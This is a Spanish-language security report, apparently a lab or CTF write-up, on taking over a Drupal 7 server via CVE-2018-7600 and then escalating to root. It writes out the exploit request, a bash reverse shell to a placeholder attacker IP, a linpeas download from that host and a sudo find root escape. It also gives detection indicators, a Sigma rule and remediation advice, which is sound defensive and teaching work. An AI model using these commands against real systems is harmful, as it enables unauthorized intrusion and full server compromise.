# Informe de Seguridad - Compromiso de Servidor Drupal (RCE + Privilege Escalation)

---

## 1. Resumen Ejecutivo

Durante la evaluación de seguridad se identificó una vulnerabilidad crítica en un servidor Drupal que permite ejecución remota de código (RCE), explotada exitosamente para obtener acceso inicial y escalar privilegios hasta root.

La vulnerabilidad explotada corresponde a:

* **CVE-2018-7600 (Drupalgeddon2)**

---

### Impacto

* Ejecución remota de comandos sin autenticación
* Acceso al sistema como usuario del servicio web
* Escalada de privilegios a root
* Compromiso total del servidor

---

### Nivel de riesgo: **CRÍTICO**

---

## 2. Alcance

* Objetivo: Host Linux
* IP: `<TARGET_IP>`
* Servicio principal: HTTP (Drupal CMS)
* Metodología: Black Box (Enumeración → Explotación → Post-Explotación)

---

## 3. Enumeración

### 3.1 Escaneo de puertos

```bash
nmap -p- --open -sS -Pn --min-rate 5000 <TARGET_IP>
```

### Resultado relevante:

```
22/tcp open  ssh
80/tcp open  http
```

---

### 3.2 Enumeración web

Acceso al puerto 80 revela un CMS Drupal.

```bash
whatweb http://<TARGET_IP>
```

Resultado:

```
Drupal version 7.x detected
```

Fuerza bruta de directorios:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

---

## 4. Explotación (Acceso inicial)

### 4.1 Vulnerabilidad identificada

Drupal 7.x vulnerable a:

* **CVE-2018-7600 (Drupalgeddon2)**
* Permite ejecución remota de código sin autenticación

---

### 4.2 Explotación manual (RCE)

Petición HTTP maliciosa:

```bash
curl -s -X POST "http://<TARGET_IP>/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=id" 
```

### Evidencia:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✔ Confirmación de ejecución remota de comandos

---

### 4.3 Obtención de reverse shell

Payload:

```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

Listener:

```bash
nc -lvnp 4444
```

Resultado:

```
connect to [ATTACKER_IP] from [TARGET_IP]
www-data@target:/var/www/html$
```

---

## 5. Post-Explotación (Enumeración local)

### 5.1 Información del sistema

```bash
uname -a
id
```

---

### 5.2 Enumeración automatizada

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### 5.3 Revisión manual de privilegios

```bash
sudo -l
```

Resultado:

```
User www-data may run the following commands:
(root) NOPASSWD: /usr/bin/find
```

---

## 6. Escalada de privilegios

### 6.1 Abuso de binario SUDO (GTFOBins)

El binario `find` permite ejecución de comandos:

```bash
sudo find . -exec /bin/sh \; -quit
```

---

### 6.2 Resultado

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

✔ Acceso root obtenido

---

## 7. Evidencias clave

* Drupal 7.x vulnerable expuesto públicamente
* Ejecución remota confirmada mediante RCE
* Reverse shell establecida
* Permisos sudo inseguros detectados
* Escalada de privilegios exitosa
* Acceso root obtenido

---

## 8. Visión SOC (Detección y Monitorización)

### 8.1 Indicadores de compromiso (IoC)

* Requests HTTP con parámetros:

  * `#post_render`
  * `#markup`
* Ejecución de comandos desde proceso web (www-data)
* Conexiones salientes a puertos no habituales (reverse shell)
* Uso de sudo desde usuario web

---

### 8.2 Logs relevantes

#### Web Logs

```
/var/log/apache2/access.log
```

Indicadores:

* POST requests anómalos
* Payloads con parámetros Drupal exploit

---

#### System Logs

```
/var/log/auth.log
```

Indicadores:

* Ejecución de sudo sin autenticación
* Elevación de privilegios

---

#### Network Monitoring

* Conexiones salientes a IP externa (ATTACKER_IP)
* Tráfico TCP sospechoso (puertos altos)

---

### 8.3 Reglas de detección (ejemplo)

#### Sigma (detección RCE Drupal)

```yaml
title: Drupal RCE Attempt
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "#post_render"
      - "#markup"
  condition: selection
level: high
```

---

### 8.4 MITRE ATT&CK

* T1190 – Exploit Public-Facing Application
* T1059 – Command Execution
* T1071 – Application Layer Protocol
* T1068 – Privilege Escalation
* T1548 – Abuse Elevation Control Mechanism

---

## 9. Recomendaciones

### 9.1 Aplicación web

* Actualizar Drupal a versión parcheada
* Aplicar actualizaciones de seguridad críticas
* Implementar WAF

---

### 9.2 Sistema

* Eliminar permisos sudo innecesarios
* Aplicar principio de mínimo privilegio
* Auditar binarios con privilegios

---

### 9.3 Red

* Restringir conexiones salientes
* Implementar IDS/IPS

---

### 9.4 Monitorización

* Alertas por ejecución de comandos desde Apache
* Detección de reverse shells
* Correlación entre logs web + sistema

---

## 10. Conclusión

Cadena de ataque completa:

1. Descubrimiento de servicio HTTP
2. Identificación de Drupal 7 vulnerable
3. Explotación RCE (CVE-2018-7600)
4. Ejecución remota de comandos
5. Reverse shell
6. Enumeración local
7. Abuso de permisos sudo (find)
8. Escalada a root

---

### Causa raíz

* Software desactualizado
* Exposición de servicio vulnerable
* Configuración insegura de privilegios
* Falta de monitorización activa

---

### Resultado final

✔ **Compromiso total del sistema**
